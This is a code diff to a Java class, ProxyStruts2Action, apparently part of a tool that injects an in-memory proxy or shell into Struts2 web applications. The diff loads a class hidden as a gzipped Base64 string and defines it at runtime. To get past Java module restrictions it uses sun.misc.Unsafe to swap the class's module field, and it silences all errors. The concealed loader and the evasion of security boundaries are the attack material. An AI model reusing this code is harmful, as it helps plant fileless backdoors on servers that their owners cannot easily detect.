@@ -5,18 +5,17 @@ import javax.servlet.http.HttpServletResponse;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.util.zip.GZIPInputStream;
 
-public class ProxyStruts2Action extends ClassLoader {
+public class ProxyStruts2Action {
     private static volatile Class<?> proxyHttpClass;
     private static String proxyHttpGZipBase64;
 
     public ProxyStruts2Action() {
-    }
-
-    protected ProxyStruts2Action(ClassLoader parent) {
-        super(parent);
     }
 
     public void execute() throws Exception {
@@ -36,12 +35,48 @@ public class ProxyStruts2Action extends ClassLoader {
             synchronized (ProxyStruts2Action.class) {
                 if (proxyHttpClass == null) {
                     byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
-                    proxyHttpClass = new ProxyStruts2Action(Thread.currentThread().getContextClassLoader())
-                            .defineClass(bytes, 0, bytes.length);
+                    proxyHttpClass = reflectionDefineClass(bytes);
                 }
             }
         }
         return proxyHttpClass;
+    }
+
+    private static Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
+        Object unsafe = null;
+        Object rawModule = null;
+        long offset = 48;
+        Method getAndSetObjectMethod = null;
+        try {
+            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            unsafe = unsafeField.get(null);
+            rawModule = Class.class.getMethod("getModule").invoke(ProxyStruts2Action.class, (Object[]) null);
+            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
+            Method objectFieldOffsetMethod = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
+            offset = (Long) objectFieldOffsetMethod.invoke(unsafe, Class.class.getDeclaredField("module"));
+            getAndSetObjectMethod = unsafe.getClass().getMethod(
+                    "getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.invoke(unsafe, ProxyStruts2Action.class, offset, module);
+        } catch (Throwable ignored) {
+        }
+
+        try {
+            URLClassLoader classLoader = new URLClassLoader(
+                    new URL[0], Thread.currentThread().getContextClassLoader());
+            Method defineMethod = ClassLoader.class.getDeclaredMethod(
+                    "defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+            defineMethod.setAccessible(true);
+            return (Class<?>) defineMethod.invoke(classLoader, classBytes, 0, classBytes.length);
+        } finally {
+            if (getAndSetObjectMethod != null && rawModule != null) {
+                try {
+                    getAndSetObjectMethod.invoke(unsafe, ProxyStruts2Action.class, offset, rawModule);
+                } catch (Throwable ignored) {
+                }
+            }
+        }
     }
 
     @SuppressWarnings("all")
